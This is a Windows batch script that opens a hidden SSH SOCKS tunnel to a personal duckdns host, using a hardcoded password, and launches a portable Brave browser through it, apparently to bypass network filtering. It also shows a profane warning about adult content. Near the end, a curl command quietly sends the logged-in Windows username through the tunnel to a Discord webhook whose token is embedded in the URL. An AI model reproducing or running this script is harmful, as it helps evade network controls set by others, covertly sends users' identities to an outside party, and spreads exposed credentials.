@echo off
setlocal enabledelayedexpansion
set "USER=%USERNAME%"
cls
echo WHOEVER THE FUCK IS WATCHING 18+ CONTENT ON THIS NEEDS TO STOP.
echo THIS IS YOUR ONE AND ONLY WARNING
timeout /t 29 /nobreak


echo Starting bypass...
:: -D 1080 sets up the SOCKS proxy
:: -pw password67 handles the authentication
:: -batch prevents interactive prompts
:: -N ensures no shell is opened
start "" /b "BravePortable\plink.exe" -batch -pw password67 -hostkey "SHA256:91kWQJz3BT8C9UhfjzeoIPp28Ak7wNODxypuaCyeAxU" -N -D 1080 ezbat@doubleaaguy.duckdns.org
echo Launching Brave...
start "" "BravePortable\brave-portable\brave-portable.exe"


curl --proxy socks5h://127.0.0.1:1080 -H "Content-Type: application/json" -d "{\"content\":\"%USER%\"}" "https://discord.com/api/webhooks/1496159081264709704/Wj-se7KZdOBo-uX0D2yrCx9vpp5eHSdGThnOYz-mBcXLHaTu_PEynKDfwgx0QSGozupV"


echo Done.
